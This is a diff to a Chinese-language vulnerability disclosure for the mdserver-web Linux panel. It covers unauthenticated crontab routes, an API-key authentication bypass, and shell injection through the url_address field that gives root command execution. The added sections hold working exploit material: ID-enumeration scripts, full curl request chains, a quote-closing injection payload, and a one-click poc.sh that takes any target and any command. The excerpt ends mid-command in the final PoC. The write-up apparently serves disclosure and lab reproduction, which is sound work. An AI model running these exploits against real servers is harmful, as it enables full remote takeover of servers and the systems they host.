@@ -6,15 +6,17 @@
 
 **mdserver-web** 是一款基于 Python/Flask 开发的轻量级 Linux 服务器管理面板，提供网站管理、数据库管理、计划任务（Crontab）调度、文件管理、防火墙配置等功能，支持 Debian/Ubuntu/CentOS/Fedora 等主流 Linux 发行版，项目托管于 GitHub（[midoks/mdserver-web](https://github.com/midoks/mdserver-web)）。
 
-在 commit **`33cabc8e2`（2026-04-15 17:33）** 之前的版本中，存在以下三类安全漏洞：
+在 commit **`33cabc8e2`（2026-04-15 17:33）** 之前的版本中，存在以下四类安全漏洞：
 
 1. **多处未授权访问（Unauthenticated Access）**：`web/admin/crontab/__init__.py` 中 **8 个路由**在注册时漏写了 `@panel_login_required` 装饰器，任何未登录用户均可直接调用这些接口；`web/admin/site/site_default.py` 中 **1 个路由** 同样缺少认证装饰器。
 
-2. **信息泄露（Information Disclosure）**：未授权的 `/site/get_site_doc` 接口会将服务器上 OpenResty/Nginx 配置文件的绝对路径直接返回给攻击者，从而暴露服务器目录结构。
+2. **信息泄露（Information Disclosure）**：未授权的 `/site/get_site_doc` 接口会将服务器上 OpenResty/Nginx 配置文件的绝对路径直接返回给攻击者；`/crontab/get_crond_find` 和 `/crontab/get_data_list` 同样无认证，可枚举任务详情及服务器上托管的网站/数据库列表。
 
-3. **认证中间件缺陷 + Shell 注入 → 远程代码执行（RCE）**：`panel_login_required` 中存在危险默认值、IP 白名单从未校验、空指针异常等逻辑缺陷；计划任务 `toUrl` 类型将 `url_address` 参数直接拼入 Shell 命令，导致 Shell 注入 RCE。
+3. **无认证 Shell 注入 → RCE**：`/crontab/modify_crond`（无认证）可将任意 Shell 注入计划任务脚本，`/crontab/start_task`（无认证）可立即触发执行，全程不需要登录凭据。组合利用只需先用 `/crontab/get_crond_find` 枚举到一个有效任务 ID，即可在服务器上执行任意命令。
 
-上述漏洞链式组合：**在未获得任何认证凭据的情况下，攻击者即可对计划任务执行增删改查及立即触发，最终实现服务器任意命令执行。**
+4. **认证中间件缺陷（Auth Middleware Bypass）**：`panel_login_required` 存在危险默认值（`open:True`）、IP 白名单从未校验、空指针异常等逻辑缺陷；持有合法 `App-Id`/`App-Secret` 的攻击者可完全绕过 Session 认证，访问所有受 `@panel_login_required` 保护的接口，再结合 Shell 注入实现 RCE。
+
+上述漏洞链式组合：**在未获得任何认证凭据的情况下，攻击者即可通过 3 步无认证请求（枚举ID → 注入Shell → 触发执行）实现服务器任意命令执行。**
 
 ---
 
@@ -230,59 +232,361 @@ def panel_login_required(func):
 
 ### 五、漏洞四：Shell 注入 → 远程代码执行（`web/utils/crontab.py`）
 
-#### 漏洞代码
+#### 5.1 `modify_crond` 完整代码调用链
+
+理解 RCE 链路，必须先追踪 `POST /crontab/modify_crond` → `POST /crontab/start_task` 的完整内部执行路径。
+
+```
+POST /crontab/modify_crond
+  └─ MwCrontab.instance().modifyCrond(cron_id, request_data)
+       │
+       ├─ ① cronCheck(data)                   # 参数校验（见下节）
+       │
+       ├─ ② info = thisdb.getCrond(cron_id)   # 从 SQLite 查询任务记录
+       │       → 若 cron_id 不存在：info = None
+       │         → 下一行 info['echo'] 触发 TypeError → 500
+       │         ✴️  结论：必须提供数据库中已存在的任务 ID
+       │
+       ├─ ③ self.removeForCrond(info['echo']) # 从 /var/spool/cron 中移除旧 cron 行
+       │
+       ├─ ④ thisdb.setCrontabData(cron_id, dbdata)  # 将新数据写入 DB
+       │
+       └─ ⑤ self.syncToCrond(cron_id)
+               └─ getShell(info)              # 用更新后的数据重新生成 Shell 脚本
+                    │
+                    ├─ stype == 'toUrl':
+                    │     shell = head + "curl ... '" + param['url_address'] + "'"
+                    │                                  ↑ 直接字符串拼接，无转义
+                    │
+                    └─ checkScript(shell)     # 黑名单替换（形同虚设）
+                         └─ 写入 /www/server/cron/<echo_hash>
+```
+
+```
+POST /crontab/start_task
+  └─ MwCrontab.instance().startTask(cron_id)
+       │
+       ├─ data = thisdb.getCrond(cron_id)
+       ├─ cmd_file = getServerDir() + '/cron/' + data['echo']
+       ├─ os.system('chmod +x ' + cmd_file)
+       └─ os.system('nohup ' + cmd_file + ' >> ' + cmd_file + '.log 2>&1 &')
+            ↑ 直接执行磁盘上的 Shell 脚本，无任何二次校验
+```
+
+#### 5.2 为什么必须提供有效的任务 ID
+
+`modifyCrond` 第 43 行（`thisdb.getCrond(cron_id)`）从 SQLite 数据库中查询任务记录，返回值直接被第 60 行使用（`info['echo']`）：
 
 ```python
-def getShell(self, param):
-    if stype == 'toUrl':
-        # url_address 直接拼入 shell 命令，无任何转义
-        shell = head + "curl -sS --connect-timeout 10 -m 60 '" + param['url_address'] + "'"
+# web/utils/crontab.py: modifyCrond()
+info = thisdb.getCrond(cron_id)          # 若不存在则返回 None
+
+if not self.removeForCrond(info['echo']): # ← None['echo'] → TypeError 500
+    return mw.returnData(False, '...')
 ```
 
-`checkScript()` 的黑名单过滤（`shutdown`、`mkfs` 等）形同虚设，单引号闭合即可注入：
+```python
+# web/thisdb/crontab.py: getCrond()
+def getCrond(id):
+    # 查不到记录时返回 None（SQLite .find() 的行为）
+    return mw.M('crontab').where('id=?', (id,)).field(__field).find()
+```
+
+因此：**`cron_id` 必须是数据库中真实存在的记录 ID，否则请求直接以 500 报错结束，Shell 注入无法触发。**
+
+#### 5.3 任务 ID 的特征与枚举策略
+
+| 特征 | 说明 |
+|------|------|
+| 类型 | SQLite `INTEGER PRIMARY KEY AUTOINCREMENT`，从 **1** 开始递增 |
+| 间隔 | 正常情况下连续，从未手动删除时最大 ID ≤ 当前任务数 |
+| 枚举接口 | `POST /crontab/get_crond_find`（**无认证**），传 `id=N` |
+| 存在判断 | 返回包含 `"name"` 字段的 JSON → 有效；返回 `null` / 空 → 不存在 |
+
+**无认证枚举脚本**（利用另一个未授权接口）：
+
+```bash
+# get_crond_find 无需任何认证，可直接枚举所有任务 ID
+for i in $(seq 1 50); do
+  resp=$(curl -s -X POST http://TARGET:7200/crontab/get_crond_find -d "id=$i")
+  # 返回值非 null 且包含 name 字段说明任务存在
+  if echo "$resp" | python3 -c "import json,sys; d=json.load(sys.stdin); exit(0 if d and d.get('name') else 1)" 2>/dev/null; then
+    echo "[+] Found task id=$i: $(echo $resp | python3 -c "import json,sys; print(json.load(sys.stdin).get('name','?'))")"
+  fi
+done
+```
+
+典型返回值（任务存在）：
+
+```json
+{
+  "id": 1,
+  "name": "daily_backup",
+  "type": "day",
+  "where1": "",
+  "where_hour": "3",
+  "where_minute": "0",
+  "echo": "a3f1b2c4d5e6...",   ← 磁盘上脚本文件名（md5 hash）
+  "status": 1,
+  "stype": "toUrl",
+  "url_address": "https://example.com/check",
+  ...
+}
+```
+
+任务不存在时返回：`null`
+
+#### 5.4 `modify_crond` 最小参数集与类型约束
+
+`modifyCrond` 调用 `cronCheck(data)` 进行参数校验：
+
+```python
+# web/utils/crontab.py: cronCheck()
+def cronCheck(self, params):
+    # 备份类任务（site/database/logs/path）需要 save 字段
+    if params['stype'] in ('site', 'database', 'logs', 'path'):
+        if params['save'] == '':
+            return False, '保留份数不能为空!'
+
+    # toUrl / 自定义脚本 (sbody) 无此校验 ← 无需 save
+    
+    if params['type'] == 'day':
+        # 需要 hour 和 minute
+        if params['hour'] == '': return False, '...'
+        if params['minute'] == '': return False, '...'
+    
+    if params['type'] == 'minute-n':
+        # 只需要 where1（间隔分钟数）
+        if params['where1'] == '': return False, '...'
+    ...
+```
+
+**最小可用参数组合**（利用 `type=minute-n` 绕开 `hour`/`minute` 的必填校验）：
+
+| 参数 | 值 | 说明 |
+|------|-----|------|
+| `id` | `<valid>` | 数据库中存在的任务 ID（必须） |
+| `name` | 任意非空字符串 | 可沿用原任务名以降低可见性 |
+| `type` | `minute-n` | 每 N 分钟执行；只需 `where1`，无需 `hour`/`minute` |
+| `where1` | `1` | 每 1 分钟（cronCheck 只检查非空） |
+| `stype` | `toUrl` | 路由到 `curl` 拼接分支；无需 `save` 字段 |
+| `url_address` | `'; PAYLOAD; echo '` | **注入点** |
+| 其余字段 | 留空 | `name`/`sname`/`sbody`/`backup_to`/`attr`/`save` 均可为空 |
+
+#### 5.5 Shell 注入原理
+
+`getShell()` 中 `stype=toUrl` 分支：
+
+```python
+# web/utils/crontab.py: getShell()
+if stype == 'toUrl':
+    # url_address 直接用单引号包裹后拼入 shell 字符串
+    shell = head + "curl -sS --connect-timeout 10 -m 60 '" + param['url_address'] + "'"
+```
+
+`checkScript()` 仅替换极少数固定关键词，**无法防御任何真实的 Shell 注入**：
+
+```python
+# web/utils/crontab.py: checkScript()
+def checkScript(self, shell):
+    keys = ['shutdown', 'init 0', 'mkfs', 'passwd',
+            'chpasswd', '--stdin', 'mkfs.ext', 'mke2fs']
+    for k in keys:
+        shell = shell.replace(k, '[***]')  # 简单字符串替换，轻松绕过
+    return shell
+```
+
+**注入 Payload 构造**：
 
 ```
-'; id > /tmp/pwned.txt; echo '
+url_address = '; id > /tmp/pwned.txt; echo '
 ```
 
-生成脚本：
+拼接后生成的 Shell 脚本片段：
 
 ```bash
 curl -sS --connect-timeout 10 -m 60 ''; id > /tmp/pwned.txt; echo ''
+#                                    ↑↑    ↑ 注入命令执行    ↑↑ 闭合收尾
 ```
+
+整个脚本写入 `/www/server/cron/<echo_hash>`，然后由 `startTask` 以 `nohup` 方式在后台以 **root** 身份执行。
 
 ---
 
 ### 六、完整攻击链（无需任何已有凭据）
 
+#### 6.1 攻击时序与接口调用图
+
 ```
-攻击者（未登录状态）
+攻击者（未登录，无任何凭据）
   │
-  ├─[1]─ POST /crontab/get_data_list    ← 无认证
-  │       type=site
-  │       → 获取所有网站名称列表（信息收集）
+  ├─[0]─ 信息收集（可选，用于规避检测）
+  │       POST /crontab/get_data_list    ← 无认证
+  │       body: type=site
+  │       → 返回服务器所有网站列表
+  │         用于了解目标环境、与任务名称对照
   │
-  ├─[2]─ POST /crontab/list            ← 需认证（但此接口有认证）
-  │       → 若已有任务 ID（来自步骤1信息），跳至步骤3
-  │       → 或直接猜测 ID（从 1 开始自增）
+  ├─[1]─ 枚举有效任务 ID（关键前置步骤）
+  │       POST /crontab/get_crond_find   ← 无认证
+  │       body: id=1（从 1 开始递增尝试）
+  │       │
+  │       ├── 返回 null → 该 ID 不存在，尝试 id=2, 3...
+  │       └── 返回 JSON（含 name/echo/stype 等字段）
+  │               → 记录 ID、name、type、where1、hour、minute
+  │               ✴️ modify_crond 在 modifyCrond() 第43行调用
+  │                  getCrond(id)，ID 不存在则 info=None，
+  │                  第60行 info['echo'] 直接 TypeError 500
+  │                  ∴ 此步骤是 RCE 的必要前置条件
   │
-  ├─[3]─ POST /crontab/modify_crond    ← 无认证 ⚠️
-  │       id=<已有任务ID>
-  │       stype=toUrl
-  │       url_address='; id>/tmp/pwned.txt; echo '
-  │       → 篡改已有计划任务，注入恶意 Shell
+  ├─[2]─ 注入恶意 Shell（无认证篡改任务脚本）
+  │       POST /crontab/modify_crond     ← 无认证 ⚠️
+  │       body:
+  │         id=<步骤1获得的有效ID>
+  │         name=<任意非空，可沿用原名>
+  │         type=minute-n               ← 最小参数类型（只需 where1）
+  │         where1=1                    ← cronCheck 仅验证非空
+  │         stype=toUrl                 ← 路由到 curl 拼接分支
+  │         url_address='; CMD; echo '  ← Shell 注入点
+  │       │
+  │       内部执行路径：
+  │         cronCheck() → OK
+  │         getCrond(id) → 取出 info['echo']（shell 脚本文件名）
+  │         removeForCrond(echo) → 从 crontab 文件移除旧调度行
+  │         setCrontabData() → 写入新参数到 DB
+  │         syncToCrond() → getShell() 生成含注入的 shell 脚本
+  │                       → checkScript()（黑名单无效）
+  │                       → 写入 /www/server/cron/<echo_hash>
+  │       → 响应: {"status": true, "msg": "修改计划任务[...]成功"}
   │
-  ├─[4]─ POST /crontab/start_task      ← 无认证 ⚠️
-  │       id=<已有任务ID>
-  │       → 立即触发执行
+  ├─[3]─ 立即触发执行（无认证触发脚本）
+  │       POST /crontab/start_task       ← 无认证 ⚠️
+  │       body: id=<同上>
+  │       │
+  │       内部执行：
+  │         getCrond(id) → data['echo']
+  │         os.system('nohup /www/server/cron/<hash> >> .log 2>&1 &')
+  │         ↑ 以 root 身份直接执行已被注入的 shell 脚本
+  │       → 响应: {"status": true, "msg": "计划任务【...】已执行!"}
   │
-  └─[RCE]─ 服务器执行任意命令 ✅（全程无需登录）
+  └─[RCE]─ 服务器以 root 身份执行任意命令 ✅（全程无任何登录凭据）
 ```
 
-**注意**：步骤 2 中 `/crontab/list` 有认证要求，但可替换为：
-- 直接从 1 开始暴力猜测 `id`（任务 ID 为自增整数，从 1 开始）
-- 使用 `/crontab/get_crond_find`（无认证）枚举任务
-- 通过 `/site/get_site_doc`（无认证）泄露路径后判断任务是否存在
+#### 6.2 攻击约束与边界条件
+
+| 约束 | 细节 |
+|------|------|
+| **必须有效任务 ID** | `modify_crond` 内部 `getCrond(id)` 若返回 `None`，下一行 `info['echo']` 触发 `TypeError` 500，注入失败 |
+| **ID 枚举方式** | `get_crond_find`（无认证），从 ID=1 递增；ID 为 SQLite AUTOINCREMENT，通常从 1 开始连续 |
+| **任务名称** | `name` 字段必须非空（`len(data['name']) < 1` 会被拒绝），其余内容无限制 |
+| **类型参数** | `type=minute-n` + `where1=1` 是通过 `cronCheck` 验证所需参数最少的组合 |
+| **stype** | 必须是 `toUrl`（或含注入的 `sbody` 用于自定义脚本分支），才能触发 `curl` 拼接注入 |
+| **任务状态** | 任务 `status=0`（已禁用）时 `syncToCrond` 会跳过 cron 注册但仍写入脚本文件，`startTask` 仍可执行 |
+| **并发安全** | 多个请求可同时修改并触发，无锁保护 |
+
+---
+
+### 七、漏洞五：API Key 认证绕过 + Shell 注入 RCE（面板 API 开启场景）
+
+> **适用范围**：此漏洞独立于 §二-§六 的无认证路由漏洞，适用于**所有版本（含 PR #884 修复后）**；只要攻击者获得了有效的 `App-Id`/`App-Secret`，即可绕过 `@panel_login_required` 装饰器，访问包括 `/crontab/add` 在内的所有受保护接口，并结合 Shell 注入实现 RCE。
+
+#### 7.1 认证中间件代码分析
+
+```python
+# web/admin/user_login_check.py
+def panel_login_required(func):
+    @wraps(func)
+    def wrapper(*args, **kwargs):
+        app_id = request.headers.get('App-Id', '')
+        app_secret = request.headers.get('App-Secret', '')
+
+        if app_id != '' and app_secret != '':
+            # ← ① 危险默认值：open:True
+            panel_api = thisdb.getOptionByJson('panel_api', default={"open": True})
+            if panel_api['open']:
+                return_code = 404
+                info = thisdb.getAppByAppId(app_id)
+                # ← ② 空指针：app_id 不存在时 info=None，下一行 TypeError→500
+                if app_secret != info['app_secret']:
+                    return Response(status=int(return_code))
+                # ← ③ 认证通过：直接执行目标函数，完全跳过 Session 检查
+                return func(*args, **kwargs)
+                # ← ④ IP 白名单：white_list 字段写入 DB 但此处从未读取
+
+        if not isLogined():
+            ...  # Session 认证路径
+        return func(*args, **kwargs)
+    return wrapper
+```
+
+#### 7.2 四个独立缺陷
+
+| 编号 | 位置 | 问题描述 | 危害 |
+|------|------|---------|------|
+| ① | `default={"open":True}` | `panel_api` 选项不存在时 API 默认**开启** | 新部署面板未初始化选项时天然可利用 |
+| ② | `info['app_secret']` | `app_id` 不存在时 `info=None`，触发 `TypeError` → HTTP 500 | 通过错误信息可判断 app_id 是否有效（oracle） |
+| ③ | `return func(*args, **kwargs)` | 凭据验证通过后**完全跳过 Session 认证**，直接执行 | 只要有凭据即可绕过所有路由的登录检查 |
+| ④ | `white_list` 字段 | UI 层强制填写 IP 白名单，但鉴权代码中**从未读取** | 白名单形同虚设，任意来源 IP 均可使用凭据 |
+
+#### 7.3 与无认证漏洞的关系
+
+```
+攻击场景                      凭据需求       适用版本         可利用接口
+─────────────────────────────────────────────────────────────────────
+§二-§六 无认证路由漏洞         无需任何凭据   ≤33cabc8e2       8个crontab路由 + get_site_doc
+§七 API Key 认证绕过            需App-Id/Secret 所有版本        所有 @panel_login_required 路由
+```
+
+> **两者可叠加**：在 `≤33cabc8e2` 的版本中，攻击者既可直接无认证访问未保护路由，也可用 API Key 访问受保护路由（如 `/crontab/add`）；在修复了路由认证的版本中，仅 API Key 路径仍有效。
+
+#### 7.4 API Key 绕过 + Shell 注入攻击链
+
+```
+攻击者（已获取 App-Id / App-Secret）
+  │
+  ├─[1]─ POST /crontab/add
+  │       Header: App-Id: <app_id>
+  │       Header: App-Secret: <app_secret>
+  │       body:
+  │         name=pwn_via_api
+  │         type=minute-n
+  │         where1=1
+  │         stype=toUrl
+  │         url_address='; CMD; echo '
+  │       → panel_login_required 验证 App-Id/Secret → 通过
+  │         Session 检查被完全跳过
+  │         → 响应: {"status": true, "msg": "添加成功"}
+  │
+  ├─[2]─ POST /crontab/list（获取新任务 ID）
+  │       Header: App-Id / App-Secret
+  │       body: p=1&limit=10
+  │       → 返回任务列表，从中取出刚添加任务的 ID
+  │
+  ├─[3]─ POST /crontab/start_task
+  │       Header: App-Id / App-Secret
+  │       body: id=<新任务ID>
+  │       → 立即触发注入的 Shell
+  │
+  └─[RCE]─ 服务器执行任意命令 ✅
+```
+
+#### 7.5 IP 白名单无效验证
+
+面板 UI 添加 API 应用时强制要求填写 IP 白名单，底层存储也有 `white_list` 字段，但 `panel_login_required` 从未读取它：
+
+```python
+# web/admin/setting/app.py（UI 层校验）
+limit_addr = request.form.get('limit_addr', '').strip()
+if limit_addr == '':
+    return mw.returnData(False, 'IP限制不能为空!')  # ← UI 强制填写
+rid = thisdb.addApp(app_id, app_secret, limit_addr)  # ← 写入 DB
+
+# web/admin/user_login_check.py（鉴权层）
+info = thisdb.getAppByAppId(app_id)
+# info['white_list'] 从未被读取 ← 白名单字段在鉴权代码中完全缺失
+if app_secret != info['app_secret']:  # 只校验 secret，不校验 IP
+    return Response(status=404)
+return func(*args, **kwargs)  # 直接放行，无 IP 检查
+```
 
 ---
 
@@ -419,82 +723,196 @@ stype=4: /www/server/web_conf/stop/index.html
 
 ### PoC 三：完整 RCE 利用链（全程无需登录）
 
-#### Step 1：枚举已有计划任务 ID
+#### 前置说明
+
+`modify_crond` 内部调用 `getCrond(id)` 查询数据库，若 ID 不存在返回 `None`，紧接着访问 `info['echo']` 会触发 `TypeError`（HTTP 500）。因此：
+
+> **攻击的第一步是通过 `get_crond_find`（同样无认证）枚举出数据库中已有的任务 ID，然后才能进行注入。**
+
+如果目标面板从未创建过任何计划任务，可在复现环境中先预置一条（见下文），真实场景中一般都有默认任务。
+
+---
+
+#### Phase 0：预置初始任务（仅复现环境需要）
 
 ```bash
-# 尝试枚举 ID=1 的任务详情（无认证）
-curl -s -X POST http://127.0.0.1:7200/crontab/get_crond_find \
-  -d "id=1"
-```
-
-若 ID=1 不存在，可先通过登录面板（或其他方式）创建一条初始任务，或直接从 ID=1 递增枚举。
-
-> **注意**：复现环境中可通过以下方式在容器内预先创建一条任务，以便演示无认证修改+触发：
-
-```bash
-# 在容器内以脚本方式创建初始任务（模拟已有计划任务场景）
+# 在容器内创建一条初始任务，模拟真实面板中已有计划任务的场景
 docker exec -it mdserver-web-vuln python3 - << 'EOF'
 import sys, os
 os.chdir('/www/server/mdserver-web/web')
 sys.path.insert(0, '/www/server/mdserver-web/web')
-import thisdb, core.mw as mw
 from utils.crontab import crontab as MwCrontab
 
 data = {
-    'name': 'normal_backup_task',
+    'name': 'daily_nginx_check',
     'type': 'day',
     'where1': '',
     'hour': '3',
     'minute': '0',
-    'save': '7',
+    'week': '',
+    'save': '',
     'backup_to': 'localhost',
     'stype': 'toUrl',
     'sname': '',
     'sbody': '',
-    'url_address': 'https://example.com',
+    'url_address': 'https://example.com/healthcheck',
     'attr': '',
 }
 tid = MwCrontab.instance().add(data)
-print(f"[+] 已创建任务 ID: {tid}")
+print(f"[+] 预置任务已创建，ID = {tid}")
 EOF
 ```
 
-#### Step 2：无认证修改任务注入 Shell（`/crontab/modify_crond`）
+---
+
+#### Phase 1：无认证枚举有效任务 ID（`/crontab/get_crond_find`）
+
+`get_crond_find` 接口无认证保护，直接暴露数据库查询结果：
 
 ```bash
-# 全程无需认证！直接修改 ID=1 的任务，注入 Shell 命令
-curl -s -X POST http://127.0.0.1:7200/crontab/modify_crond \
-  -d "id=1" \
-  -d "name=normal_backup_task" \
-  -d "type=day" \
-  -d "where1=" \
-  -d "hour=3" \
-  -d "minute=0" \
-  -d "save=7" \
-  -d "backup_to=localhost" \
+TARGET="http://127.0.0.1:7200"
+
+echo "[*] 枚举计划任务 ID..."
+CRON_ID=""
+CRON_NAME=""
+CRON_TYPE=""
+
+for i in $(seq 1 50); do
+  resp=$(curl -s -X POST "${TARGET}/crontab/get_crond_find" -d "id=${i}")
+  # null 或空响应 → 任务不存在
+  if [ "${resp}" = "null" ] || [ -z "${resp}" ]; then
+    continue
+  fi
+  # 解析任务元数据
+  name=$(echo "${resp}" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('name','') if d else '')" 2>/dev/null)
+  if [ -n "${name}" ]; then
+    CRON_ID="${i}"
+    CRON_NAME="${name}"
+    CRON_TYPE=$(echo "${resp}" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('type','day'))" 2>/dev/null)
+    echo "[+] 发现任务: ID=${CRON_ID}, name=${CRON_NAME}, type=${CRON_TYPE}"
+    echo "    完整任务信息: ${resp}"
+    break
+  fi
+done
+
+if [ -z "${CRON_ID}" ]; then
+  echo "[-] 未发现任何任务，请先在面板中创建一条计划任务（或运行 Phase 0）"
+  exit 1
+fi
+```
+
+**`get_crond_find` 响应样例**（任务存在时）：
+
+```json
+{
+  "id": 1,
+  "name": "daily_nginx_check",
+  "type": "day",
+  "where1": "",
+  "where_hour": "3",
+  "where_minute": "0",
+  "echo": "a3f1b2c4d5e67890abcdef1234567890",
+  "status": 1,
+  "stype": "toUrl",
+  "url_address": "https://example.com/healthcheck",
+  "save": "",
+  "backup_to": "localhost",
+  "sname": "",
+  "sbody": "",
+  "attr": "",
+  "add_time": "2026-04-15 10:00:00",
+  "update_time": "2026-04-15 10:00:00"
+}
+```
+
+> `echo` 字段是磁盘上 Shell 脚本的文件名（双重 MD5 hash），`modify_crond` 内部需要它来移除旧的 cron 行。
+
+---
+
+#### Phase 2：无认证注入恶意 Shell（`/crontab/modify_crond`）
+
+使用 `type=minute-n` + `where1=1` 是通过参数校验（`cronCheck`）的最小参数组合：`toUrl` 类型无需填写 `save`；`minute-n` 类型只需 `where1`，无需 `hour`/`minute`。
+
+```bash
+CMD='id > /tmp/pwned.txt && hostname >> /tmp/pwned.txt && whoami >> /tmp/pwned.txt'
+# 构造注入 payload：用单引号闭合 curl 命令，插入任意 Shell 指令
+PAYLOAD="'; ${CMD}; echo '"
+
+echo "[*] 正在注入恶意 Shell 到任务 ID=${CRON_ID}..."
+resp=$(curl -s -X POST "${TARGET}/crontab/modify_crond" \
+  -d "id=${CRON_ID}" \
+  -d "name=${CRON_NAME}" \
+  -d "type=minute-n" \
+  -d "where1=1" \
   -d "stype=toUrl" \
   -d "sname=" \
   -d "sbody=" \
-  --data-urlencode "url_address='; id > /tmp/pwned.txt; hostname >> /tmp/pwned.txt; echo '"
+  -d "save=" \
+  -d "backup_to=localhost" \
+  -d "attr=" \
+  --data-urlencode "url_address=${PAYLOAD}")
+
+echo "[*] modify_crond 响应: ${resp}"
+# 预期: {"status": true, "msg": "修改计划任务[daily_nginx_check]成功"}
 ```
 
-预期响应：`{"status": true, "msg": "修改成功"}`
+**内部发生了什么**：
 
-#### Step 3：无认证立即触发执行（`/crontab/start_task`）
+```
+modify_crond 接收请求
+  ↓
+cronCheck({type:'minute-n', where1:'1', stype:'toUrl', ...})
+  → where1 非空 → 通过 ✓
 
-```bash
-# 全程无需认证！立即触发任务执行
-curl -s -X POST http://127.0.0.1:7200/crontab/start_task \
-  -d "id=1"
+info = getCrond(1)
+  → {echo: 'a3f1b2c4...', name: 'daily_nginx_check', ...}
+
+removeForCrond('a3f1b2c4...')
+  → 从 /var/spool/cron/crontabs/root 移除旧调度行
+
+setCrontabData(1, {stype:'toUrl', url_address:"'; id>/tmp/pwned.txt; echo '", ...})
+  → 更新 SQLite
+
+syncToCrond(1) → getShell()
+  stype == 'toUrl':
+    shell = '...curl -sS ... \'' + "'; id>/tmp/pwned.txt; echo '" + '\''
+          = "...curl -sS --connect-timeout 10 -m 60 ''; id>/tmp/pwned.txt; echo ''"
+  checkScript(shell) → 黑名单无命中，原样返回
+  writeFile('/www/server/cron/a3f1b2c4...', shell)
+  chmod 750 /www/server/cron/a3f1b2c4...
 ```
 
-预期响应：`{"status": true, "msg": "计划任务【normal_backup_task】已执行!"}`
+---
 
-#### Step 4：验证 RCE 结果
+#### Phase 3：无认证立即触发执行（`/crontab/start_task`）
 
 ```bash
-# 等待约 1 秒后验证
-sleep 1
+echo "[*] 触发任务执行..."
+resp=$(curl -s -X POST "${TARGET}/crontab/start_task" \
+  -d "id=${CRON_ID}")
+
+echo "[*] start_task 响应: ${resp}"
+# 预期: {"status": true, "msg": "计划任务【daily_nginx_check】已执行!"}
+```
+
+**内部发生了什么**：
+
+```
+startTask(1)
+  data = getCrond(1)  → {echo: 'a3f1b2c4...', name: '...'}
+  cmd_file = '/www/server/cron/a3f1b2c4...'
+  os.system('chmod +x /www/server/cron/a3f1b2c4...')
+  os.system('nohup /www/server/cron/a3f1b2c4... >> /www/server/cron/a3f1b2c4....log 2>&1 &')
+  ↑ 以 root 身份在后台执行已被注入的 Shell 脚本
+```
+
+---
+
+#### Phase 4：验证 RCE 结果
+
+```bash
+sleep 1  # 等待后台执行完成
+echo "[*] 验证 RCE 结果..."
 docker exec mdserver-web-vuln cat /tmp/pwned.txt
 ```
 
@@ -502,10 +920,62 @@ docker exec mdserver-web-vuln cat /tmp/pwned.txt
 
 ```
 uid=0(root) gid=0(root) groups=0(root)
-<容器hostname>
+<容器 hostname>
+root
 ```
 
-🎉 **全程无需任何登录凭据，通过两个无认证接口实现远程代码执行！**
+---
+
+#### 一键自动化利用脚本
+
+```bash
+#!/bin/bash
+# PoC: mdserver-web ≤0.18.5 无认证 RCE
+# 用法: bash poc.sh <target> <command>
+# 示例: bash poc.sh http://127.0.0.1:7200 'id>/tmp/pwned.txt'
+
+TARGET="${1:-http://127.0.0.1:7200}"
+CMD="${2:-id>/tmp/pwned.txt}"
+
+echo "=== mdserver-web Unauthenticated RCE ==="
+echo "[*] Target : ${TARGET}"
+echo "[*] Command: ${CMD}"
+
+# Step 1: 枚举有效任务 ID（无认证）
+CRON_ID=""
+for i in $(seq 1 100); do
+  resp=$(curl -s -X POST "${TARGET}/crontab/get_crond_find" -d "id=${i}" 2>/dev/null)
+  name=$(echo "${resp}" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('name','') if d else '')" 2>/dev/null)
+  if [ -n "${name}" ]; then
+    CRON_ID="${i}"
+    echo "[+] Found task: id=${i}, name=${name}"
+    break
+  fi
+done
+
+[ -z "${CRON_ID}" ] && { echo "[-] No tasks found. Exiting."; exit 1; }
+
+# Step 2: 注入 Shell（无认证）
+PAYLOAD="'; ${CMD}; echo '"
+curl -s -X POST "${TARGET}/crontab/modify_crond" \
+  -d "id=${CRON_ID}" \
+  -d "name=${name}" \
+  -d "type=minute-n" \
+  -d "where1=1" \
+  -d "stype=toUrl" \
+  -d "sname=" -d "sbody=" -d "save=" \
+  -d "backup_to=localhost" -d "attr=" \
+  --data-urlencode "url_address=${PAYLOAD}" > /dev/null
+echo "[+] Payload injected into task id=${CRON_ID}"
+
+# Step 3: 立即触发执行（无认证）
+resp=$(curl -s -X POST "${TARGET}/crontab/start_task" -d "id=${CRON_ID}")
+echo "[+] Triggered: ${resp}"
+
+echo "[*] Done. Check command output on target."
+```
+
+🎉 **仅用两个无认证 POST 请求（`modify_crond` + `start_task`），无需任何账号密码，即可在目标服务器上执行任意命令。**
 
 ### PoC 四：无认证删除计划任务（破坏性）
 
@@ -526,6 +996,121 @@ curl -s -X POST http://127.0.0.1:7200/crontab/list \
   -H "App-Id: test_app_id" \
   -H "App-Secret: test_app_secret" \
   -d "p=1&limit=10"
+```
+
+---
+
+### PoC 六：API Key 认证绕过完整 RCE 利用链
+
+> 此 PoC 适用于面板 API 功能已开启且攻击者持有有效凭据的场景，适用于**所有版本（含 PR #884 修复后）**。
+
+#### 前置步骤：开启 API 并初始化凭据
+
+```bash
+# 方式一：登录面板后，进入"设置 → API 管理"，开启并添加应用
+
+# 方式二：在容器内直接通过 Python 初始化（复现环境）
+docker exec -it mdserver-web-vuln python3 - << 'EOF'
+import sys, os, json
+os.chdir('/www/server/mdserver-web/web')
+sys.path.insert(0, '/www/server/mdserver-web/web')
+import thisdb
+
+thisdb.setOption('panel_api', json.dumps({'open': True}))
+thisdb.addApp('test_app_id', 'test_app_secret', '0.0.0.0')
+print("[+] 面板 API 已开启，凭据: test_app_id / test_app_secret")
+print("[+] 注意: IP 白名单 '0.0.0.0' 实际上不会被校验（漏洞④）")
+EOF
+```
+
+#### Step 1：验证认证绕过
+
+```bash
+# 未登录状态下，正常请求被拦截
+curl -s -X POST http://127.0.0.1:7200/crontab/list -d "p=1&limit=10"
+# → 返回登录页或 4xx
+
+# 携带 API Key → 完全绕过 Session 认证
+curl -s -X POST http://127.0.0.1:7200/crontab/list \
+  -H "App-Id: test_app_id" \
+  -H "App-Secret: test_app_secret" \
+  -d "p=1&limit=10"
+# → 返回 JSON 任务列表，认证绕过成功
+```
+
+#### Step 2：通过绕过认证添加恶意任务（`/crontab/add`）
+
+```bash
+curl -s -X POST http://127.0.0.1:7200/crontab/add \
+  -H "App-Id: test_app_id" \
+  -H "App-Secret: test_app_secret" \
+  -d "name=api_pwn_task" \
+  -d "type=minute-n" \
+  -d "where1=1" \
+  -d "stype=toUrl" \
+  -d "sname=" \
+  -d "sbody=" \
+  -d "save=" \
